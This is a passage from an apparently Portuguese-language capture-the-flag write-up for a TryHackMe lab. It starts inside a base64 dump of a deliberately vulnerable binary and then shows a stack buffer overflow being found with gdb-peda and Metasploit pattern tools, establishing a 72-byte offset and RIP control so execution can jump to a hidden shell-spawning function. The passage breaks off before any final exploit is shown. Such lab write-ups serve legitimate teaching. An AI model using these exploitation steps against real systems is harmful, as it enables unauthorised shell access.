AAAAhAdAAAAAAACEBwAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEA
AAACAAAAAAAAAJAHQAAAAAAAkAcAAAAAAACVAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAA
AKgAAAABAAAAAgAAAAAAAAAoCEAAAAAAACgIAAAAAAAARAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAA
AAAAAAAAAAC2AAAAAQAAAAIAAAAAAAAAcAhAAAAAAABwCAAAAAAAACABAAAAAAAAAAAAAAAAAAAI
AAAAAAAAAAAAAAAAAAAAwAAAAA4AAAADAAAAAAAAABAOYAAAAAAAEA4AAAAAAAAIAAAAAAAAAAAA
AAAAAAAACAAAAAAAAAAIAAAAAAAAAMwAAAAPAAAAAwAAAAAAAAAYDmAAAAAAABgOAAAAAAAACAAA
AAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADYAAAABgAAAAMAAAAAAAAAIA5gAAAAAAAgDgAA
AAAAANABAAAAAAAABgAAAAAAAAAIAAAAAAAAABAAAAAAAAAA4QAAAAEAAAADAAAAAAAAAPAPYAAA
AAAA8A8AAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOYAAAABAAAAAwAAAAAA
AAAAEGAAAAAAAAAQAAAAAAAASAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADvAAAAAQAA
AAMAAAAAAAAASBBgAAAAAABIEAAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA
9QAAAAgAAAADAAAAAAAAAFgQYAAAAAAAWBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAA
AAAAAAAAAPoAAAABAAAAMAAAAAAAAAAAAAAAAAAAAFgQAAAAAAAAKQAAAAAAAAAAAAAAAAAAAAEA
AAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAACIEAAAAAAAAEgGAAAAAAAAGwAA
ACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA0BYAAAAAAAA7AgAA
AAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAsZAAAA
<span class="nv">AAAAAwEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA</span><span class="o">=</span>
</code></pre></div></div>
<p>E na minha máquina local eu faço a decriptação.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Desktop]
└─<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'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
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAUAZAAAAAAAAgBkAAAAAAAAEAAAAAAAAAAQAAAAAAAAAMAAAAAAAAAOAEQAAAAAAA
DQAAAAAAAACEB0AAAAAAABkAAAAAAAAAEA5gAAAAAAAbAAAAAAAAAAgAAAAAAAAAGgAAAAAAAAAY
DmAAAAAAABwAAAAAAAAACAAAAAAAAAD1/v9vAAAAAJgCQAAAAAAABQAAAAAAAACQA0AAAAAAAAYA
AAAAAAAAuAJAAAAAAAAKAAAAAAAAAF0AAAAAAAAACwAAAAAAAAAYAAAAAAAAABUAAAAAAAAAAAAA
AAAAAAADAAAAAAAAAAAQYAAAAAAAAgAAAAAAAACQAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAA
AAAAAFAEQAAAAAAABwAAAAAAAAAgBEAAAAAAAAgAAAAAAAAAMAAAAAAAAAAJAAAAAAAAABgAAAAA
AAAA/v//bwAAAAAABEAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAAO4DQAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAOYAAAAAAA
AAAAAAAAAAAAAAAAAAAAABYFQAAAAAAAJgVAAAAAAAA2BUAAAAAAAEYFQAAAAAAAVgVAAAAAAABm
BUAAAAAAAAAAAAAAAAAAAAAAAAAAAABHQ0M6IChVYnVudHUgNy41LjAtM3VidW50dTF+MTguMDQp
IDcuNS4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCQAAAAAAAAAAA
AAAAAAAAAAAAAwACAFQCQAAAAAAAAAAAAAAAAAAAAAAAAwADAHQCQAAAAAAAAAAAAAAAAAAAAAAA
AwAEAJgCQAAAAAAAAAAAAAAAAAAAAAAAAwAFALgCQAAAAAAAAAAAAAAAAAAAAAAAAwAGAJADQAAA
AAAAAAAAAAAAAAAAAAAAAwAHAO4DQAAAAAAAAAAAAAAAAAAAAAAAAwAIAAAEQAAAAAAAAAAAAAAA
AAAAAAAAAwAJACAEQAAAAAAAAAAAAAAAAAAAAAAAAwAKAFAEQAAAAAAAAAAAAAAAAAAAAAAAAwAL
AOAEQAAAAAAAAAAAAAAAAAAAAAAAAwAMAAAFQAAAAAAAAAAAAAAAAAAAAAAAAwANAHAFQAAAAAAA
AAAAAAAAAAAAAAAAAwAOAIQHQAAAAAAAAAAAAAAAAAAAAAAAAwAPAJAHQAAAAAAAAAAAAAAAAAAA
AAAAAwAQACgIQAAAAAAAAAAAAAAAAAAAAAAAAwARAHAIQAAAAAAAAAAAAAAAAAAAAAAAAwASABAO
YAAAAAAAAAAAAAAAAAAAAAAAAwATABgOYAAAAAAAAAAAAAAAAAAAAAAAAwAUACAOYAAAAAAAAAAA
AAAAAAAAAAAAAwAVAPAPYAAAAAAAAAAAAAAAAAAAAAAAAwAWAAAQYAAAAAAAAAAAAAAAAAAAAAAA
AwAXAEgQYAAAAAAAAAAAAAAAAAAAAAAAAwAYAFgQYAAAAAAAAAAAAAAAAAAAAAAAAwAZAAAAAAAA
AAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgANALAFQAAAAAAAAAAAAAAA
AAAOAAAAAgANAOAFQAAAAAAAAAAAAAAAAAAhAAAAAgANACAGQAAAAAAAAAAAAAAAAAA3AAAAAQAY
AFgQYAAAAAAAAQAAAAAAAABGAAAAAQATABgOYAAAAAAAAAAAAAAAAABtAAAAAgANAFAGQAAAAAAA
AAAAAAAAAAB5AAAAAQASABAOYAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAAAB
AAAABADx/wAAAAAAAAAAAAAAAAAAAACnAAAAAQARAIwJQAAAAAAAAAAAAAAAAAAAAAAABADx/wAA
AAAAAAAAAAAAAAAAAAC1AAAAAAASABgOYAAAAAAAAAAAAAAAAADGAAAAAQAUACAOYAAAAAAAAAAA
AAAAAADPAAAAAAASABAOYAAAAAAAAAAAAAAAAADiAAAAAAAQACgIQAAAAAAAAAAAAAAAAAD1AAAA
AQAWAAAQYAAAAAAAAAAAAAAAAAALAQAAEgANAIAHQAAAAAAAAgAAAAAAAACHAQAAIAAXAEgQYAAA
AAAAAAAAAAAAAAAbAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAAtAQAAEAAXAFgQYAAAAAAAAAAAAAAA
AAAVAQAAEgAOAIQHQAAAAAAAAAAAAAAAAAA0AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABIAQAAEgAA
AAAAAAAAAAAAAAAAAAAAAABcAQAAEgANAFcGQAAAAAAAgQAAAAAAAABmAQAAEgAAAAAAAAAAAAAA
AAAAAAAAAACFAQAAEAAXAEgQYAAAAAAAAAAAAAAAAACSAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACh
AQAAEQIXAFAQYAAAAAAAAAAAAAAAAACuAQAAEQAPAJAHQAAAAAAABAAAAAAAAAC9AQAAEgAAAAAA
AAAAAAAAAAAAAAAAAADPAQAAEgANABAHQAAAAAAAZQAAAAAAAADBAAAAEAAYAGAQYAAAAAAAAAAA
AAAAAADfAQAAEgINAKAFQAAAAAAAAgAAAAAAAACLAQAAEgANAHAFQAAAAAAAKwAAAAAAAAD3AQAA
EAAYAFgQYAAAAAAAAAAAAAAAAAADAgAAEgANANgGQAAAAAAAOAAAAAAAAAAIAgAAEQIXAFgQYAAA
AAAAAAAAAAAAAAAUAgAAEgAAAAAAAAAAAAAAAAAAAAAAAAAoAgAAEgAAAAAAAAAAAAAAAAAAAAAA
AADZAQAAEgALAOAEQAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25l
cwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjc2OTgAX19kb19nbG9iYWxfZHRvcnNf
YXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5
X2VudHJ5AGhhY2t0aGV3b3JsZC5jAF9fRlJBTUVfRU5EX18AX19pbml0X2FycmF5X2VuZABfRFlO
QU1JQwBfX2luaXRfYXJyYXlfc3RhcnQAX19HTlVfRUhfRlJBTUVfSERSAF9HTE9CQUxfT0ZGU0VU
X1RBQkxFXwBfX2xpYmNfY3N1X2ZpbmkAcHV0c0BAR0xJQkNfMi4yLjUAX2VkYXRhAHN5c3RlbUBA
R0xJQkNfMi4yLjUAcHJpbnRmQEBHTElCQ18yLjIuNQBjYWxsX2Jhc2gAX19saWJjX3N0YXJ0X21h
aW5AQEdMSUJDXzIuMi41AF9fZGF0YV9zdGFydABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUA
X0lPX3N0ZGluX3VzZWQAZ2V0c0BAR0xJQkNfMi4yLjUAX19saWJjX2NzdV9pbml0AF9kbF9yZWxv
Y2F0ZV9zdGF0aWNfcGllAF9fYnNzX3N0YXJ0AG1haW4AX19UTUNfRU5EX18Ac2V0dWlkQEBHTElC
Q18yLjIuNQBzbGVlcEBAR0xJQkNfMi4yLjUAAC5zeW10YWIALnN0cnRhYgAuc2hzdHJ0YWIALmlu
dGVycAAubm90ZS5BQkktdGFnAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAu
ZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5p
bml0AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJy
YXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAABsAAAABAAAAAgAAAAAAAAA4AkAAAAAAADgCAAAAAAAAHAAAAAAAAAAAAAAAAAAA
AAEAAAAAAAAAAAAAAAAAAAAjAAAABwAAAAIAAAAAAAAAVAJAAAAAAABUAgAAAAAAACAAAAAAAAAA
AAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAMQAAAAcAAAACAAAAAAAAAHQCQAAAAAAAdAIAAAAAAAAk
AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAD2//9vAgAAAAAAAACYAkAAAAAAAJgC
AAAAAAAAHAAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABOAAAACwAAAAIAAAAAAAAAuAJA
AAAAAAC4AgAAAAAAANgAAAAAAAAABgAAAAEAAAAIAAAAAAAAABgAAAAAAAAAVgAAAAMAAAACAAAA
AAAAAJADQAAAAAAAkAMAAAAAAABdAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAF4AAAD/
//9vAgAAAAAAAADuA0AAAAAAAO4DAAAAAAAAEgAAAAAAAAAFAAAAAAAAAAIAAAAAAAAAAgAAAAAA
AABrAAAA/v//bwIAAAAAAAAAAARAAAAAAAAABAAAAAAAACAAAAAAAAAABgAAAAEAAAAIAAAAAAAA
AAAAAAAAAAAAegAAAAQAAAACAAAAAAAAACAEQAAAAAAAIAQAAAAAAAAwAAAAAAAAAAUAAAAAAAAA
CAAAAAAAAAAYAAAAAAAAAIQAAAAEAAAAQgAAAAAAAABQBEAAAAAAAFAEAAAAAAAAkAAAAAAAAAAF
AAAAFgAAAAgAAAAAAAAAGAAAAAAAAACOAAAAAQAAAAYAAAAAAAAA4ARAAAAAAADgBAAAAAAAABcA
AAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAiQAAAAEAAAAGAAAAAAAAAAAFQAAAAAAAAAUA
AAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAJQAAAABAAAABgAAAAAAAABwBUAA
AAAAAHAFAAAAAAAAEgIAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAACaAAAAAQAAAAYAAAAA
AAAAhAdAAAAAAACEBwAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEA
AAACAAAAAAAAAJAHQAAAAAAAkAcAAAAAAACVAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAA
AKgAAAABAAAAAgAAAAAAAAAoCEAAAAAAACgIAAAAAAAARAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAA
AAAAAAAAAAC2AAAAAQAAAAIAAAAAAAAAcAhAAAAAAABwCAAAAAAAACABAAAAAAAAAAAAAAAAAAAI
AAAAAAAAAAAAAAAAAAAAwAAAAA4AAAADAAAAAAAAABAOYAAAAAAAEA4AAAAAAAAIAAAAAAAAAAAA
AAAAAAAACAAAAAAAAAAIAAAAAAAAAMwAAAAPAAAAAwAAAAAAAAAYDmAAAAAAABgOAAAAAAAACAAA
AAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADYAAAABgAAAAMAAAAAAAAAIA5gAAAAAAAgDgAA
AAAAANABAAAAAAAABgAAAAAAAAAIAAAAAAAAABAAAAAAAAAA4QAAAAEAAAADAAAAAAAAAPAPYAAA
AAAA8A8AAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOYAAAABAAAAAwAAAAAA
AAAAEGAAAAAAAAAQAAAAAAAASAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADvAAAAAQAA
AAMAAAAAAAAASBBgAAAAAABIEAAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA
9QAAAAgAAAADAAAAAAAAAFgQYAAAAAAAWBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAA
AAAAAAAAAPoAAAABAAAAMAAAAAAAAAAAAAAAAAAAAFgQAAAAAAAAKQAAAAAAAAAAAAAAAAAAAAEA
AAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAACIEAAAAAAAAEgGAAAAAAAAGwAA
ACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA0BYAAAAAAAA7AgAA
AAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAsZAAAA
AAAAAwEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA='</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> hacktheworld
</code></pre></div></div>
<h3 id="explorando-o-binário">Explorando o binário</h3>

<p>Ao executar o binário <code class="language-plaintext highlighter-rouge">hacktheworld</code>, percebemos que ele aceita um buffer de entrada e após recebê-lo, termina a execução.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Desktop]
└─<span class="nv">$ </span>./hacktheworld
Who <span class="k">do </span>you want to hack? AAAAA
</code></pre></div></div>
<p>Vamos tentar enviar um buffer maior e checar seu comportamento.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Desktop]
└─<span class="nv">$ </span>./hacktheworld           
Who <span class="k">do </span>you want to hack? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./hacktheworld
</code></pre></div></div>

<p>Com o envio de <code class="language-plaintext highlighter-rouge">100</code> As, temos <code class="language-plaintext highlighter-rouge">segmentation fault</code>, o que significa que atingimos o <code class="language-plaintext highlighter-rouge">buffer overflow</code>.
Vamos abrí-lo com o <code class="language-plaintext highlighter-rouge">gdb-peda</code> e analisar a nível de memória.</p>

<p><img src="/img/thm/thm-anonymousplayground-10.png" /></p>

<p>Ao inserir o comando <code class="language-plaintext highlighter-rouge">disas main</code>, podemos ver o disassembly da função main.
Ao inserir o comando <code class="language-plaintext highlighter-rouge">info functions</code>, podemos ver todas as funções que o binário utiliza.</p>

<p>Uma destas funções é a <code class="language-plaintext highlighter-rouge">call_bash</code> que não está dentro da main e não é chamada em momento nenhum, ou seja, esta é a função vulnerável, e pelo nome, vai nos dar um shell.</p>

<p>Para podermos explorar o binário, precisamos encontrar o offset para atingir o <code class="language-plaintext highlighter-rouge">RSP</code>, para isso, vamos criar um pattern de 100 caracteres com o <code class="language-plaintext highlighter-rouge">msf-pattern_create</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Desktop]
└─<span class="nv">$ </span>msf-pattern_create <span class="nt">-l</span> 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</code></pre></div></div>
<p>Agora precisamos rodar o programa no gdb e enviar este pattern.</p>

<p><img src="/img/thm/thm-anonymousplayground-11.png" /></p>

<p>O comanro <code class="language-plaintext highlighter-rouge">r</code>, roda o programa, e quando ele solicitar o buffer, enviamos nosso pattern.
O programa vai parar como esperado, para encontrarmos o valor dentro de <code class="language-plaintext highlighter-rouge">RSP</code>, podemos usar o comando <code class="language-plaintext highlighter-rouge">x\gx $rsp</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/gx <span class="nv">$rsp</span>
0x7fffffffdf68: 0x6341356341346341
</code></pre></div></div>
<p>Temos como resposta o valor <code class="language-plaintext highlighter-rouge">0x6341356341346341</code>, vamos pesquisar este valor com o <code class="language-plaintext highlighter-rouge">msf-pattern_offset</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Desktop]
└─<span class="nv">$ </span>msf-pattern_offset <span class="nt">-l</span> 100 <span class="nt">-q</span> 6341356341346341
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 72
</code></pre></div></div>

<p>Encontramos o offset de 72, o que segnifica que se enviarmos um buffer de 72 caracteres, os próximos 6 vão preencher o endereço de retorno.
Podemos fazer um teste, enviando um buffer de 72 As e + 6 Bs, e verificar se o RIP foi preenchido pelos B.</p>

<p><img src="/img/thm/thm-anonymousplayground-12.png" /></p>

<p>Como podemos ver, ao enviar 72 A + 6 B, nosso endereço RIP foi preenchido com os B, o que significa que temos total controle em como o programa vai se comportar.</p>

<p>O que precisamos fazer é enviar um buffer de 72 caracteres para preencher o offset, e em seguida enviar o endereço da função <code class="language-plaintext highlighter-rouge">call_bash</code>, assim seremos direcionados para a função.</p>

<p>Observando o comando <code class="language-plaintext highlighter-rouge">info functions</code>, podemos obter o endereço da função.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>info functions
All defined functions:

Non-debugging symbols:
0x00000000004004e0  _init
0x0000000000400510  puts@plt
0x0000000000400520  system@plt
